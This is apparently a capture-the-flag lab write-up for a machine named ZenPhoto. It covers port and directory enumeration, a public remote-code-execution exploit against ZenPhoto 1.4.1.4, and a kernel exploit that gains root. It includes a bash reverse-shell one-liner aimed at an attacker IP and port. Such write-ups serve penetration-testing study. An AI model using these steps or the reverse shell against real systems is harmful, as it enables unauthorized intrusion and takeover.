# ZenPhoto

## Gaining Access

Nmap scan:

```
$ nmap -p- --min-rate 3000 192.168.175.41 
Starting Nmap 7.93 ( https://nmap.org ) at 2023-07-01 20:19 +08
Nmap scan report for 192.168.175.41
Host is up (0.17s latency).
Not shown: 65531 closed tcp ports (conn-refused)
PORT     STATE SERVICE
22/tcp   open  ssh
23/tcp   open  telnet
80/tcp   open  http
3306/tcp open  mysql
```

Of all things, Telnet is open.&#x20;

### Web Enum -> ZenPhoto RCE

Port 80 just shows this:

<figure><img src="../../../.gitbook/assets/image (224).png" alt=""><figcaption></figcaption></figure>

A `gobuster` scan reveals the following directories:

```
$ gobuster dir -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://192.168.175.41/ -t 100
===============================================================
Gobuster v3.3
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.175.41/
[+] Method:                  GET
[+] Threads:                 100
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.3
[+] Timeout:                 10s
===============================================================
2023/07/01 20:22:15 Starting gobuster in directory enumeration mode
===============================================================
/index                (Status: 200) [Size: 75]
/test                 (Status: 301) [Size: 315] [--> http://192.168.175.41/test/]
```

Visiting `/test` reveals a ZenPhoto instance:

<figure><img src="../../../.gitbook/assets/image (3137).png" alt=""><figcaption></figcaption></figure>

Viewing the page source reveals the version of ZenPhoto that is running:

<figure><img src="../../../.gitbook/assets/image (1513).png" alt=""><figcaption></figcaption></figure>

There are RCE exploits available for this instance:

```
$ searchsploit zenphoto 1.4.1.4
----------------------------------------------------------- ---------------------------------
 Exploit Title                                             |  Path
----------------------------------------------------------- ---------------------------------
ZenPhoto 1.4.1.4 - 'ajax_create_folder.php' Remote Code Ex | php/webapps/18083.php
----------------------------------------------------------- ---------------------------------
```

This exploits works in getting me a webshell:

<figure><img src="../../../.gitbook/assets/image (2066).png" alt=""><figcaption></figcaption></figure>

We can get a reverse shell using this one-liner:

```bash
bash -c 'bash -i >& /dev/tcp/192.168.45.164/4444 0>&1'
```

<figure><img src="../../../.gitbook/assets/image (542).png" alt=""><figcaption></figcaption></figure>

## Privilege Escalation

### Kernel Exploit -> Root

This machine was running on a really old Linux kernel version:

```
www-data@offsecsrv:/home$ uname -a
Linux offsecsrv 2.6.32-21-generic #32-Ubuntu SMP Fri Apr 16 08:10:02 UTC 2010 i686 GNU/Linux
```

There are quite a few exploits that might work for this version of Linux running. I used this one:

{% embed url="https://www.exploit-db.com/exploits/15704" %}

Compile it on the machine itself using `gcc exploit.c -o exploit`. Then, run it to get a `root` shell:

<figure><img src="../../../.gitbook/assets/image (3840).png" alt=""><figcaption></figcaption></figure>

Rooted!
